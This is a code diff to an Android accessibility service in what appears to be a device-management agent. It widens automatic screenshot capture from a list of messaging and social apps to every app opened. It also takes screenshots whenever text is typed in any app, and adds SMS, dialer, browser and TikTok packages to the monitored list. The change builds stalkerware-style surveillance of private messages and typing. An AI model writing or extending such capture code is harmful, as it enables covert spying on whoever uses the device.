@@ -26,13 +26,28 @@ class MDMAccessibilityService : AccessibilityService() {
         private const val SCREENSHOT_THROTTLE = 5000L  // 5 seconds between screenshots
         private const val SCREENSHOT_MIN_DELAY = 3000L  // 3 seconds after app opens
 
-        // Apps to monitor for screenshots
+        // Apps to monitor for screenshots - expanded list
+        // Also: when autoScreenshotEnabled is true, we screenshot ANY app that opens
+        // (not just these). This list is kept for priority logging.
         private val MONITORED_APPS = setOf(
             "com.whatsapp", "com.whatsapp.w4b",
             "com.telegram.messenger", "org.telegram.messenger",
-            "com.google.android.gm", "com.android.mms",
+            "com.google.android.gm",  // Gmail
+            "com.android.mms",  // SMS (AOSP)
+            "com.samsung.android.messaging",  // Samsung SMS
+            "com.google.android.apps.messaging",  // Google Messages
             "com.facebook.katana", "com.instagram.android",
-            "com.snapchat.android", "com.twitter.android"
+            "com.snapchat.android", "com.twitter.android",
+            "com.android.chrome",  // Google Chrome
+            "com.google.android.googlequicksearchbox",  // Google app
+            "com.android.settings",  // Settings
+            "com.android.dialer",  // Phone dialer
+            "com.samsung.android.dialer",  // Samsung dialer
+            "com.google.android.youtube",  // YouTube
+            "com.netflix.mediaclient",  // Netflix
+            "com.spotify.music",  // Spotify
+            "com.ss.android.ugc.trill",  // TikTok
+            "com.zhiliaoapp.musically"  // TikTok (alt)
         )
 
         @Volatile private var instance: MDMAccessibilityService? = null
@@ -135,11 +150,14 @@ class MDMAccessibilityService : AccessibilityService() {
                 if (pkg.isNotEmpty()) {
                     Log.d(TAG, "Window: $pkg / $cls")
 
-                    if (autoScreenshotEnabled && pkg in MONITORED_APPS) {
+                    // ✅ Auto-screenshot on ANY app when enabled (not just monitored apps)
+                    // This ensures screenshots work for Google, SMS, WhatsApp, etc.
+                    if (autoScreenshotEnabled && pkg != "com.mdm.agent") {
                         val now = System.currentTimeMillis()
                         if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
                             lastScreenshotTime = now
-                            Log.i(TAG, "📸 Auto-screenshot: $pkg opened")
+                            val isMonitored = pkg in MONITORED_APPS
+                            Log.i(TAG, "📸 Auto-screenshot: $pkg opened (monitored=$isMonitored)")
                             Handler(Looper.getMainLooper()).postDelayed({
                                 takeAutoScreenshot(pkg)
                             }, SCREENSHOT_MIN_DELAY)
@@ -149,9 +167,10 @@ class MDMAccessibilityService : AccessibilityService() {
             }
 
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                // ✅ Auto-screenshot on text changes in ANY app when enabled
                 if (autoScreenshotEnabled) {
                     val pkg = event.packageName?.toString() ?: ""
-                    if (pkg in MONITORED_APPS) {
+                    if (pkg != "com.mdm.agent") {
                         val now = System.currentTimeMillis()
                         if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
                             lastScreenshotTime = now
